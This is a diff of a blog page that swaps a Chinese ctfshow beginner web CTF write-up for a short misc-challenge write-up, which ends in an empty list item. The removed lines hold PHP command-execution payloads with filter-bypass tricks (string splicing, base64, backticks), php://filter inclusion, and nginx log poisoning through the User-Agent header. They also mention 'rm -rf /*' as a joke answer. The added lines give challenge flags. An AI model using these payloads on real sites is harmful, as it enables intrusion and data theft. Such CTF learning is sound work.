@@ -19,46 +19,28 @@
   <meta name="author" content="sakula33">
   <meta name="keywords" content="">
   
-    <meta name="description" content="今天做的是ctfshow中的萌新板块中的web类的题目，用这篇文章记录一下wp web01 打开靶机，查看源码  分析一下这个代码，首先提示了id要等于1000会出现flag，但是代码中也写到了如果id大于999就会输出id error那么就要考虑一下绕过intval()函数 查阅了一下网上的资料  intval函数特性： intval函数是获取变量的整型值，当它获取的变量不能被转换时返回0； 如">
+    <meta name="description" content="这篇文章记录ctsshow上菜狗杯的部分题目的wp misc  01.杂项签到 直接把文件放到winhex中，搜索ctfshow直接得到了flag  02.损坏的压缩包 附件是一个压缩包，把他放到winhex中进行查看，发现文件头是png  更改文件后缀为png，得到一张图片，上面显示flag  03.谜之栅栏 题目提示了找不同，用winhex的比较文件功能   两个文本拼接起来，得到flag c">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-web_萌新">
-<meta property="og:url" content="https://sakula33.github.io/2025/02/22/ctfshow-web-%E8%90%8C%E6%96%B0/index.html">
+<meta property="og:title" content="ctdshow菜狗杯">
+<meta property="og:url" content="https://sakula33.github.io/2025/03/01/ctdshow%E8%8F%9C%E7%8B%97%E6%9D%AF/index.html">
 <meta property="og:site_name" content="sakula33">
-<meta property="og:description" content="今天做的是ctfshow中的萌新板块中的web类的题目，用这篇文章记录一下wp web01 打开靶机，查看源码  分析一下这个代码，首先提示了id要等于1000会出现flag，但是代码中也写到了如果id大于999就会输出id error那么就要考虑一下绕过intval()函数 查阅了一下网上的资料  intval函数特性： intval函数是获取变量的整型值，当它获取的变量不能被转换时返回0； 如">
+<meta property="og:description" content="这篇文章记录ctsshow上菜狗杯的部分题目的wp misc  01.杂项签到 直接把文件放到winhex中，搜索ctfshow直接得到了flag  02.损坏的压缩包 附件是一个压缩包，把他放到winhex中进行查看，发现文件头是png  更改文件后缀为png，得到一张图片，上面显示flag  03.谜之栅栏 题目提示了找不同，用winhex的比较文件功能   两个文本拼接起来，得到flag c">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/2.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/3.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/4.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/5.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/6.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/7.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/8.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/9.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/10.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/11.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/12.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/13.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1401.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1402.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1403.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/15.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1601.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1602.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1701.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1702.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1703.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1704.png">
-<meta property="article:published_time" content="2025-02-22T07:40:59.000Z">
-<meta property="article:modified_time" content="2025-03-01T07:26:24.748Z">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%9D%82%E9%A1%B9%E7%AD%BE%E5%88%B0.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%851.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%852.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E8%B0%9C%E4%B9%8B%E6%A0%85%E6%A0%8F1.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E8%B0%9C%E4%B9%8B%E6%A0%85%E6%A0%8F1.png">
+<meta property="article:published_time" content="2025-03-01T14:41:54.000Z">
+<meta property="article:modified_time" content="2025-03-01T15:42:43.686Z">
 <meta property="article:author" content="sakula33">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://sakula33.github.io/images/ctfshow-web-%E8%90%8C%E6%96%B0/1.png">
+<meta name="twitter:image" content="https://sakula33.github.io/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%9D%82%E9%A1%B9%E7%AD%BE%E5%88%B0.png">
   
   
   
-  <title>ctfshow-web_萌新 - sakula33</title>
+  <title>ctdshow菜狗杯 - sakula33</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -244,7 +226,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ctfshow-web_萌新"></span>
+            <span id="subtitle" data-typed-text="ctdshow菜狗杯"></span>
           
         </div>
 
@@ -255,8 +237,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-22 15:40" pubdate>
-          2025年2月22日 下午
+        <time datetime="2025-03-01 22:41" pubdate>
+          2025年3月1日 晚上
         </time>
       </span>
     
@@ -267,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k 字
+          145 字
         
       </span>
     
@@ -278,7 +260,7 @@
         
         
         
-          13 分钟
+          2 分钟
         
       </span>
     
@@ -315,149 +297,34 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">ctfshow-web_萌新</h1>
+            <h1 id="seo-header">ctdshow菜狗杯</h1>
             
             
               <div class="markdown-body">
                 
-                <p>今天做的是ctfshow中的萌新板块中的web类的题目，用这篇文章记录一下wp</p>
-<p>web01</p>
-<p>打开靶机，查看源码</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1.png" srcset="/img/loading.gif" lazyload></p>
-<p>分析一下这个代码，首先提示了id要等于1000会出现flag，但是代码中也写到了如果id大于999就会输出id error<br>那么就要考虑一下绕过intval()函数</p>
-<p>查阅了一下网上的资料</p>
-<b>
-intval函数特性：<br>
-intval函数是获取变量的整型值，当它获取的变量不能被转换时返回0；<br>
-如果字符串其中有数字，则返回数字；<br>
-如果开头无法被转换，则返回0；
-</b>
+                <p>这篇文章记录ctsshow上菜狗杯的部分题目的wp</p>
+<h1>misc</h1>
 
-<p>所以有以下几种方式绕过：</p>
-<p>1.单引号绕过: &#x2F;?id&#x3D;’1000’</p>
-<p>2.相乘绕过: &#x2F;?id&#x3D;100*10</p>
-<p>3.十六进制绕过: &#x2F;?id&#x3D;0x3e8</p>
-<p>4.二进制绕过: &#x2F;?id&#x3D;0b1111101000</p>
-<p>5.逻辑或绕过: &#x2F;?id&#x3D;999 or id&#x3D;1000</p>
-<p>6.二次去反绕过: &#x2F;?id&#x3D;~~1000</p>
-<p>等等</p>
-<p>绕过即可得到flag。</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/2.png" srcset="/img/loading.gif" lazyload></p>
-<p>web02</p>
-<p>相比于上一题加了一些过滤，如or<br>我用的单引号绕过</p>
-<p>web03</p>
-<p>过滤了更多东西，把十六进制绕过给过滤了<br>依旧用单引号绕过</p>
-<p>web04<br>可以看到再次增加过滤的东西</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/3.png" srcset="/img/loading.gif" lazyload></p>
-<p>可以看到十六进制和乘号被过滤了，其他的没有被过滤</p>
-<p>我们依旧采用单引号进行绕过</p>
-<p>web05</p>
-<p>这次我们看到把单引号和双引号也给过滤了</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/4.png" srcset="/img/loading.gif" lazyload></p>
-<p>但是没有过滤二进制，那我们这次用二进制绕过</p>
-<p>web06</p>
-<p>继续进行查看发现还是继续增加过滤</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/5.png" srcset="/img/loading.gif" lazyload></p>
-<p>但是依旧没有过滤二进制，那么我们继续用二进制进行绕过</p>
-<p>web07</p>
-<p>继续进行查看，这次过滤了~.</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/6.png" srcset="/img/loading.gif" lazyload></p>
-<p>那么二次去反就无法使用了，但是依旧还是没有过滤二进制 (阿呆也是够马虎的)</p>
-<p>web08</p>
-<p>结束了阿呆传奇，我们迎来了这个题</p>
-<p>首先查看源代码</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/7.png" srcset="/img/loading.gif" lazyload></p>
-<p>要找这个key，我也不知道这个Key是哪来的</p>
-<p>查看了别人的wp发现这是一个梗题</p>
-<p>阿呆的一系列操作就是删库跑路了</p>
-<p>所以是rm -rf &#x2F;*</p>
-<p>这样就得到了flag</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/8.png" srcset="/img/loading.gif" lazyload></p>
-<p>web09</p>
-<p>我的天，又是你阿呆！</p>
-<p>首先来看代码</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/9.png" srcset="/img/loading.gif" lazyload></p>
-<p>这是一道命令执行题</p>
-<p>看到有system</p>
-<p>直接&#x2F;?c&#x3D;system(‘cat config.php’);</p>
-<p>得到flag</p>
-<p>web10</p>
-<p>首先观察代码，发现相较于上一题做了过滤</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/10.png" srcset="/img/loading.gif" lazyload></p>
-<p>有两种方法</p>
-<p>方法一是使用passthru函数</p>
-<p>&#x2F;?c&#x3D;passthru(‘cat config.php’);</p>
-<p>方法二是函数拼接</p>
-<p>&#x2F;?c&#x3D;$a&#x3D;’sys’;$b&#x3D;’tem’;$d&#x3D;$a.$b;$d(‘cat config.php’);</p>
-<p>常见的命令执行函数：<br>system()<br>passthru()<br>exec()<br>shell_exec()<br>popen()<br>proc_open()<br>pcntl_exec()</p>
-<p>这样就可以得到flag</p>
-<p>web11</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/11.png" srcset="/img/loading.gif" lazyload></p>
-<p>观察代码，这次是将cat给过滤了</p>
-<p>但是还有很多显示文本的命令</p>
-<b>
-cat命令用于连接文件并打印到标准输出设备上。
-
-<p>tac将文件全部内容从尾到头反向连续输出到标准输出(屏幕)上</p>
-<p>more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示 </p>
-<p>less 与 more 类似，less 可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。</p>
-<p>head 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。</p>
-<p>tail 命令可用于查看文件的内容，有一个常用的参数 -f 常用于查阅正在改变的日志文件。</p>
-<p>head 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。</p>
-<p>sort 命令用于将文本文件内容加以排序。</p>
-<p>nl命令在linux系统中用来计算文件中行号</p>
-<p>uniq 可检查文本文件中重复出现的行列</p>
-<p>Linux中，&#96;&#96; 作用是优先执行里面的内容，再把里面的内容传给外面的语句<br></p></b><p></p>
-<p>web12</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/12.png" srcset="/img/loading.gif" lazyload></p>
-<p>这次过滤的更多了，把 php , config , . ,也给过滤了</p>
-<p>那我们把config.php进行base64编码绕过</p>
-<p>?c&#x3D;$a&#x3D;base64_decode(%22c3lzdGVt%22);$b&#x3D;base64_decode(%22Y2F0IGNvbmZpZy5waHA&#x3D;%22);$a($b);</p>
-<p>这样便得到了flag</p>
-<p>web13</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/13.png" srcset="/img/loading.gif" lazyload></p>
-<p>还是继续增加过滤，这次将 file 和 ; 给过滤了</p>
-<p> ?c&#x3D;passthru(base64_decode(%27Y2F0IGNvbmZpZy5waHA&#x3D;%27))?%3E</p>
-<p>此处涉及到php中反引号的作用：</p>
-<p><b>执行其内的语句并返回值</b></p>
-<p>这样得到flag</p>
-<p>web14</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1401.png" srcset="/img/loading.gif" lazyload></p>
-<p>这次是增加了括号</p>
-<p> ?c&#x3D;include$_GET[‘a’]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php</p>
-<p>这样进行绕过</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1402.png" srcset="/img/loading.gif" lazyload></p>
-<p>得到了一串base64编码的文本</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1403.png" srcset="/img/loading.gif" lazyload></p>
-<p>解码之后得到flag</p>
-<p>web15</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/15.png" srcset="/img/loading.gif" lazyload></p>
-<p>这次对等号，问号和星号进行了过滤，反而分号可以用了</p>
-<p>用反引号接收一个参数a,然后a中是所需执行的语句</p>
-<p>?c&#x3D;echo <code>$_GET[a]</code>;&amp;a&#x3D;cat config.php</p>
-<p>这样得到flag</p>
-<p>web16</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1601.png" srcset="/img/loading.gif" lazyload></p>
-<p>这道题的代码显示，ctfshow加上参数c的md5值等于 a6f57ae38a22448c2f07f3f95f49c84e</p>
-<p>进行md5解密</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1602.png" srcset="/img/loading.gif" lazyload></p>
-<p>这个结果去掉ctfshow就是我们要传入的参数c了</p>
-<p>得到flag</p>
-<p>web17</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1701.png" srcset="/img/loading.gif" lazyload></p>
-<p>过滤了php，首先考虑了data伪协议，但是经过尝试之后发现不行</p>
-<p>看了其他大佬的wp之后，知道了是一道日志包含题，抓包之后查看得知服务器为Ubuntu(由nginx搭建的网站，nginx的日志文件默认地址在var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log)</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1702.png" srcset="/img/loading.gif" lazyload></p>
-<p>那我们创建payload：</p>
-<p><b>&#x2F;?c&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</b></p>
-<p>然后用bp抓包，在UA处增加<?php echo system('ls');?></p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1703.png" srcset="/img/loading.gif" lazyload></p>
-<p>这样我们得到了36d.php和index.php两个文件名</p>
-<p><img src="/images/ctfshow-web-%E8%90%8C%E6%96%B0/1704.png" srcset="/img/loading.gif" lazyload></p>
-<p>接下来再在UA处<?php highlight_file('36d.php');?></p>
-<p>这样我们就得到了flag</p>
-<p>注意，日志包含类的题目不能出现语法错误，不然就会一直出现相同的报错，必须重开容器了。</p>
-<p>接下来的web18-web21都可以这样解决</p>
+<p>01.杂项签到</p>
+<p>直接把文件放到winhex中，搜索ctfshow直接得到了flag</p>
+<p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%9D%82%E9%A1%B9%E7%AD%BE%E5%88%B0.png" srcset="/img/loading.gif" lazyload></p>
+<p>02.损坏的压缩包</p>
+<p>附件是一个压缩包，把他放到winhex中进行查看，发现文件头是png</p>
+<p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%851.png" srcset="/img/loading.gif" lazyload></p>
+<p>更改文件后缀为png，得到一张图片，上面显示flag</p>
+<p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%852.png" srcset="/img/loading.gif" lazyload></p>
+<p>03.谜之栅栏</p>
+<p>题目提示了找不同，用winhex的比较文件功能</p>
+<p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E8%B0%9C%E4%B9%8B%E6%A0%85%E6%A0%8F1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/%E8%B0%9C%E4%B9%8B%E6%A0%85%E6%A0%8F1.png" srcset="/img/loading.gif" lazyload></p>
+<p>两个文本拼接起来，得到flag</p>
+<p>ctfshow{f0a6a0b721cfb949a7fb55ab5d8d210a}</p>
+<p>04.你真的会数数吗</p>
+<p>这里用010的词频统计直方图功能得到flag</p>
+<p>ctfshow{a1b2d3e4g56i7j8k9l0}</p>
+<ol start="5">
+<li></li>
+</ol>
 
                 
               </div>
@@ -476,7 +343,7 @@ cat命令用于连接文件并打印到标准输出设备上。
     
       <span class="category-chain">
         
-  <a href="/categories/web/" class="category-chain-item">web</a>
+  <a href="/categories/%E7%BB%BC%E5%90%88/" class="category-chain-item">综合</a>
   
   
 
@@ -503,8 +370,8 @@ cat命令用于连接文件并打印到标准输出设备上。
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ctfshow-web_萌新</div>
-      <div>https://sakula33.github.io/2025/02/22/ctfshow-web-萌新/</div>
+      <div>ctdshow菜狗杯</div>
+      <div>https://sakula33.github.io/2025/03/01/ctdshow菜狗杯/</div>
     </div>
     <div class="license-meta">
       
@@ -516,7 +383,7 @@ cat命令用于连接文件并打印到标准输出设备上。
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月22日</div>
+          <div>2025年3月1日</div>
         </div>
       
       
@@ -548,18 +415,12 @@ cat命令用于连接文件并打印到标准输出设备上。
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/03/01/ctdshow%E8%8F%9C%E7%8B%97%E6%9D%AF/" title="ctdshow菜狗杯">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ctdshow菜狗杯</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/18/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97js%E5%9F%BA%E7%A1%80/" title="学习日志js基础">
-                        <span class="hidden-mobile">学习日志js基础</span>
+                      <a href="/2025/02/22/ctfshow-web-%E8%90%8C%E6%96%B0/" title="ctfshow-web_萌新">
+                        <span class="hidden-mobile">ctfshow-web_萌新</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
